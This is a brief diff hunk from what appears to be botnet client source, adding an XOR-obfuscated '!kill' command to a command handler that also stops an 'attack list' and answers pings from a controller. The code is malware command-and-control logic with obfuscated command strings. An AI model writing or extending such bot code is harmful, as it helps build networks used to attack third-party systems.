@@ -150,6 +150,8 @@ def cmdHandle(sock):
 				elif command[0] == xor_dec('QAAQCRc=',key):
 					stop = True
 					attack = 0#clear attack list
+				elif command[0] == xor_dec('QBgNCgs=',key):#!kill : kill bot
+					sys.exit(1)
 			except:
 				pass
 		if data == xor_dec("ERoKAQ==",key):#ping
